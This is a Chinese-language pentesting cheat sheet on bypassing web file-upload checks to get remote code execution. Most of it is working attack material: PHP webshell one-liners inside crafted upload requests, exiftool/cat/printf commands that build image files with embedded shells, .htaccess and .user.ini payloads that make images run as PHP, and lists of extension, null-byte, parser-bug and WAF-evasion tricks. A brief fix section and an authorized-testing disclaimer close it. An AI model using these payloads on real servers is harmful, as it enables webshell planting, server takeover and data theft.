# 文件上传绕过全系列实战

> 文件上传漏洞是 Web 应用中最容易导致远程代码执行（RCE）的入口之一。本文档系统梳理前端校验、后端黑名单、内容头检测、解析漏洞等各类绕过手法。

## 1. 文件上传检测层级概览

典型的文件上传防护通常包含以下若干层：

| 层级 | 检测点 | 常见绕过手法 |
|------|--------|-------------|
| 前端（JS） | `accept` 属性、`onchange` 扩展名检查 | 禁用 JS、改包、浏览器开发者工具 |
| 扩展名 | 黑名单 / 白名单 | 大小写、双写、特殊字符、空格、点号 |
| MIME 类型 | `Content-Type` 头 | Burp Repeater 修改为 `image/png` 等 |
| 文件内容头 | 幻数（Magic Number） | 图片头部拼接 + Shell 尾部 / 图片马 |
| 大小 / 数量 | 文件大小限制 | 小 Shell、截断、分块上传 |
| 二次渲染 | 图片重新处理（GD、ImageMagick） | 针对特定库的绕过 / 注入 WebShell 到 EXIF |
| WAF / 流量层 | 关键字检测、文件内容扫描 | 编码、分块、畸形请求、垃圾填充 |

## 2. 前端与 MIME 类型绕过

### 2.1 前端 JavaScript 校验绕过

最简单的防护是在前端用 JS 检查扩展名。Burp 抓包或禁用 JavaScript 即可绕过：

```
# 原始请求
POST /upload.php
Content-Disposition: form-data; name="file"; filename="shell.jpg"
Content-Type: application/octet-stream

<?php system($_GET['c']); ?>

# 绕过：直接在 Repeater 中将 shell.jpg 改为 shell.php
filename="shell.php"
```

### 2.2 MIME 类型绕过

部分应用仅校验 `Content-Type` 是否为合法图片类型：

```
Content-Type: image/png          # 用图片 MIME 类型，内容仍是 PHP
Content-Type: image/jpeg
Content-Type: application/x-shockwave-flash  # 经典 Flash 上传

# 典型请求
POST /upload HTTP/1.1
Content-Disposition: form-data; name="file"; filename="evil.php"
Content-Type: image/png

<?php eval($_POST['x']); ?>
```

同时也存在反向情形：上传 `.htaccess` 或 `.user.ini` 时，`Content-Type` 设为 `text/plain` 往往可绕过图片检测。

## 3. 扩展名绕过（黑名单 / 白名单）

### 3.1 黑名单绕过

对于 `php / asp / aspx / jsp / exe` 等关键字做黑名单的场景：

| 目标语言 | 可尝试的备选扩展名 |
|---------|------------------|
| PHP | `php2`、`php3`、`php4`、`php5`、`phtml`、`phar`、`php7`、`pht` |
| ASP | `asa`、`cer`、`cdx`、`asp;jpg`（IIS 6 解析漏洞） |
| ASPX | `ascx`、`ashx`、`asmx`、`axd` |
| JSP | `jspa`、`jspx`、`jsw`、`jsv`、`jspf`、`jhtml` |
| 可执行脚本 | `pl`、`py`、`cgi`、`sh` |

### 3.2 大小写与特殊字符绕过

Windows / IIS 默认大小写不敏感，且对尾部空格、点号、`::$DATA` 等不处理：

```
shell.php       # 常规
shell.Php       # 大小写混合
shell.pHp       
shell.php.      # Windows 会自动去除尾部点号
shell.php (空格)  # 尾部空格
shell.php::$DATA    # Windows NTFS 数据流
shell.php:.jpg       # 冒号截断（NTFS 特性）
```

### 3.3 双写与过滤不彻底

若应用仅做一次 `str_replace('php', '', $filename)`，可双写绕过：

```
shell.pphphp      →  过滤后 shell.php
shell.phtmlphp    →  shell.phtml
```

### 3.4 白名单场景：00 截断 / 路径截断

当应用将上传文件存储到 `$_GET['path'] . '/filename'` 且使用旧版 PHP（< 5.3.4）或 C 系语言写的后端时，空字节 `%00` 可截断后续字符：

```
/upload.php?path=./uploads/shell.php%00
POST body 内附加图片，filename="a.jpg"
# 实际写入路径为 ./uploads/shell.php（截断了 .jpg）
```

类似地，利用路径拼接 `./uploads/shell.php/` 配合某些中间件（IIS、Nginx 老版本）也能触发路径截断。

## 4. 文件内容头绕过（图片马）

当应用检测文件开头若干字节是否为图片幻数（Magic Number），可将真实图片头部与 Shell 拼接：

```bash
# 方法一：图片 + Shell 合并（Windows copy / Linux cat）
copy /b normal.jpg + shell.php shell.jpg    # Windows
cat normal.jpg shell.php > shell.jpg        # Linux

# 方法二：在图片 EXIF / Comment 字段插入 PHP 代码
exiftool -Comment='<?php system($_GET["c"]); ?>' normal.jpg -o exif.jpg

# 方法三：GIF 头部伪造 + Shell
printf 'GIF89a\n<?php eval($_POST["c"]); ?>' > shell.php.gif

# 常见图片头部
FF D8 FF         # JPEG
47 49 46 38      # GIF（GIF89a）
89 50 4E 47      # PNG
00 00 01 00      # ICO
42 4D             # BMP
```

最终上传文件扩展名取决于中间件解析规则，常搭配 `.htaccess`、`.user.ini` 让图片被当作 PHP 执行。

## 5. 中间件解析漏洞

解析漏洞是"即使上传的是图片也能执行代码"的关键。常见解析漏洞如下表：

| 中间件 / 环境 | 漏洞表现 | 利用方式 |
|--------------|---------|---------|
| **Apache AddHandler** | 配置 `AddHandler application/x-httpd-php .php`，文件名含 `.php.` 的部分也会被 PHP 解析 | `shell.php.jpg`、`shell.php.rar` |
| **Apache mod_php CGI** | 对 `/a.php/foo.png` 以 PHP 解析 `a.php`，忽略 `/foo.png` | 上传合法 `a.php`，访问 `a.php/1.png` 触发 |
| **Nginx + PHP CGI** | 配置中 `cgi.fix_pathinfo=1`，对 `/a.png/evil.php` 会执行 `a.png` 为 PHP | 上传图片马，访问 `shell.png/x.php` |
| **IIS 6.0** | 分号解析：`xx.asp;yyy.jpg` 以 ASP 执行 | `shell.asp;1.jpg` |
| **IIS 7.5 / Nginx < 0.8.37** | 与 Nginx CGI 类似 | `shell.jpg%00.php` |
| **PHP CGI 远程文件解析（CVE-2012-1823）** | 对 `index.php?-s` 参数泄露源码 | 结合上传写入 |
| **phtml / phar** | Apache 默认配置中 `phtml` 往往是可执行脚本 | 上传 `shell.phtml` |

### 5.1 .htaccess 与 .user.ini 注入

若目标为 PHP + Apache，且允许上传 `.htaccess`，可实现任意后缀文件以 PHP 解析：

```
# .htaccess 文件内容（配合上传的 shell.png）
AddType application/x-httpd-php .png
php_flag engine 1
```

对于 Nginx + PHP-FPM 场景，可上传 `.user.ini`：

```
; .user.ini 内容
auto_prepend_file = shell.png    # 要求 user_ini.filename = .user.ini 且目标 PHP 允许
```

图片马 `shell.png` 中含有 `<?php ... ?>`，后续每次访问同目录下 `.php` 文件都会被自动 `include`。

## 6. 文件包含 + 上传的组合拳

当上传路径不可直接执行（如 CDN 域名、`Content-Disposition: attachment`）时，需结合文件包含漏洞：

```php
# 后台某处存在本地文件包含
include($_GET['f']);

# 利用：上传 shell.txt，访问 /include.php?f=./uploads/20250901_shell.txt
```

常见的包含源：
- 上传的附件
- Session 文件（`/var/lib/php/sessions/sess_xxxxx`）
- 日志文件（`access.log`、`error.log`，注入 PHP 代码到 User-Agent）
- `/proc/self/environ`（当 HTTP 头可控时）

## 7. 二次渲染与 ImageMagick 漏洞

图片经过 PHP GD / ImageMagick 等库重新压缩 / 裁剪后，简单拼接的图片马可能被擦除。此时思路包括：

1. **找到不被擦除的块**：反复尝试插入到 EXIF、ICC Profile、JPEG 注释等元数据区
2. **ImageMagick 反序列化 / Ghostscript**：旧版本 ImageMagick 处理某些特殊构造的 PNG / SVG 会导致命令执行（CVE-2016-3714 ImageTragick、CVE-2018-16509 Ghostscript）
3. **Zip / RAR 解压到任意路径**：上传压缩包，若后台解压路径可预测或可注入，则可写入 Shell

## 8. WAF 绕过技巧

- **分块传输**：`Transfer-Encoding: chunked` 将 payload 分块，绕过基于关键字的正则匹配
- **垃圾数据填充**：在文件前填充大量 `\x00` 或随机字节，突破 WAF 仅检测前 N 字节
- **双文件上传**：一次 multipart 中包含两个文件字段，第二个含 payload 的字段往往被 WAF 忽略
- **参数名 / filename 超长**：触发 WAF 正则回溯超限，直接放行
- **`Content-Disposition` 换行 / 大小写**：`FILEname`、`form-data;` 异常大小写

## 9. 修复建议

1. **白名单 + 严格扩展名匹配**：不接受任何非预期后缀，拒绝 `.php.jpg` 类文件名
2. **服务器端重新命名**：`md5(原文件名 + 时间戳) + 白名单扩展名`，避免注入路径
3. **上传目录禁止脚本执行**：`php_flag engine 0`、Nginx `location ~ \.php$ { deny all; }`
4. **文件内容校验**：GD 重新渲染图片、图片格式二次编码
5. **权限最小化**：Web 进程不可写，上传目录与执行目录物理隔离
6. **WAF / RASP 辅助**：流量层与运行时层双检测

---

> 本手册仅用于合法授权的安全测试。实战中务必遵守《网络安全法》及相关法律法规。
